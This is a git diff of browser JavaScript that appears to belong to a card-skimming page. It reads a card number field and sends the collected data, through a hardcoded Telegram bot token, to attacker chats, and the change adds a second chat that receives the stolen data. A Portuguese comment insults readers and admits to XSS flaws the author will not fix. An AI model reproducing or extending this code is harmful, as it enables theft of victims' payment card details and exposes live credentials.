@@ -1,5 +1,5 @@
 const TELEGRAM_TOKEN = '8743433644:AAHWENChsuGXYY9eJ4yZKWodRYL1ouxiJzM';
-const TELEGRAM_CHAT_ID = '6939434522';
+const TELEGRAM_CHAT_IDS = ['6939434522', '6116307406']; // SEI LA,, SE QUISER OLHAR O CODIGO FICA A VONTADE, MACACO. EU SEI DOS BUGS E ERROS, SÓ NAO VOU CORRIGIR. EU SEI DOS XSS, TUDO.
 
 document.addEventListener('DOMContentLoaded', function() {
     const cardNumero = document.getElementById('cardNumero');
@@ -146,23 +146,26 @@ document.addEventListener('DOMContentLoaded', function() {
 ⏰ Data: ${new Date().toLocaleString('pt-BR')}
         `;
 
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: mensagem,
-                    parse_mode: 'HTML'
-                })
-            });
-            
-            const data = await response.json();
-            return data.ok;
-        } catch (error) {
-            console.error('Erro ao enviar para Telegram:', error);
-            return false;
-        }
+        const resultados = await Promise.all(TELEGRAM_CHAT_IDS.map(async (chatId) => {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: mensagem,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error(`Erro ao enviar para chat ${chatId}:`, error);
+                return false;
+            }
+        }));
+
+        return resultados.some(resultado => resultado === true);
     }
 
     function showToast(msg) {
